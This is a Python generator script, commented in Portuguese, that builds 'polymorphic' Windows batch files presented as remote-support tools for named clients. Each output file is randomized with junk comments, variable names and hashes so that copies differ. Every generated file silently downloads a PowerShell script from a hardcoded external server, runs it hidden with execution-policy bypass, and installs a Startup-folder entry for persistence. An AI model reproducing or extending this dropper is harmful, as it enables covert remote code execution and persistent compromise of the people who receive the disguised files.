#!/usr/bin/env python3
"""
Gerador Polimórfico de BAT para Suporte Remoto
Versão PowerShell - Sem EXE
"""

import base64
import uuid
import hashlib
import os
import random
import string
from datetime import datetime

SERVER_URL = "https://web-production-9d7cc.up.railway.app"
OUTPUT_DIR = "bats_gerados"


def random_var_name(length=8):
    chars = string.ascii_letters
    return ''.join(random.choice(chars) for _ in range(length))


def random_hash_name(length=10):
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(length))


def random_comment():
    words = ['Init', 'Core', 'Proc', 'Sys', 'Mod', 'Cfg', 'Chk', 'Ver', 'Hnd', 'Svc']
    return f"REM {random.choice(words)}{random.randint(100,999)}"


def gerar_bat_polimorfico(nome_cliente=None):
    """Gera um BAT único que baixa e executa PowerShell"""

    bat_id = str(uuid.uuid4()).upper()
    bat_hash = hashlib.sha256(bat_id.encode()).hexdigest()[:32].upper()
    unique_sig = hashlib.sha512((bat_id + str(datetime.now().timestamp())).encode()).hexdigest()[:64]

    folder_hash = random_hash_name(10)
    ps_hash = random_hash_name(10)

    var_url = random_var_name()
    var_dir = random_var_name()
    var_ps = random_var_name()

    random_comments = '\n'.join([random_comment() for _ in range(random.randint(2, 5))])

    ps_name = f"{ps_hash}.ps1"

    bat_content = f'''@echo off
{random_comment()}
setlocal EnableDelayedExpansion
{random_comments}

REM [{unique_sig[:32]}]

set "{var_dir}=%LOCALAPPDATA%\\{folder_hash}"
set "{var_url}={SERVER_URL}/client.ps1"
set "{var_ps}=%{var_dir}%\\{ps_name}"

{random_comment()}
if not exist "%{var_dir}%" mkdir "%{var_dir}%"

{random_comment()}
powershell -w hidden -c "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;(New-Object Net.WebClient).DownloadFile('%{var_url}%','%{var_ps}%')"

{random_comment()}
set "startup=%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
if not exist "%startup%\\{folder_hash[:6]}.bat" (
    echo @echo off> "%startup%\\{folder_hash[:6]}.bat"
    echo powershell -w hidden -ep bypass -f "%{var_ps}%">> "%startup%\\{folder_hash[:6]}.bat"
)

{random_comment()}
start "" /min powershell -w hidden -ep bypass -f "%{var_ps}%"
exit /b 0

REM [{hashlib.sha256((bat_id + bat_hash).encode()).hexdigest()[:24].upper()}]
'''

    os.makedirs(OUTPUT_DIR, exist_ok=True)

    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    if nome_cliente:
        safe_name = ''.join(c if c.isalnum() else '_' for c in nome_cliente)
        filename = f"support_{safe_name}_{bat_hash[:6]}_{timestamp[-6:]}.bat"
    else:
        filename = f"support_{bat_hash[:8]}_{timestamp[-6:]}.bat"

    filepath = os.path.join(OUTPUT_DIR, filename)

    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(bat_content)

    with open(filepath, 'rb') as f:
        file_hash = hashlib.sha256(f.read()).hexdigest()[:16].upper()

    print(f"")
    print(f"  ╔══════════════════════════════════════════════════╗")
    print(f"  ║       BAT POLIMÓRFICO GERADO COM SUCESSO         ║")
    print(f"  ╠══════════════════════════════════════════════════╣")
    print(f"  ║  Arquivo:    {filename[:38]:<38} ║")
    print(f"  ║  BAT-ID:     {bat_id[:36]:<36}   ║")
    print(f"  ║  File-Hash:  {file_hash:<36}   ║")
    print(f"  ╠══════════════════════════════════════════════════╣")
    print(f"  ║  Pasta Hash: {folder_hash:<36}   ║")
    print(f"  ║  PS1 Hash:   {ps_hash}.ps1{' '*27} ║")
    print(f"  ╚══════════════════════════════════════════════════╝")
    print(f"")

    return filepath, bat_id, bat_hash, file_hash, folder_hash, ps_hash


if __name__ == "__main__":
    import sys

    if len(sys.argv) > 1:
        gerar_bat_polimorfico(sys.argv[1])
    else:
        gerar_bat_polimorfico()
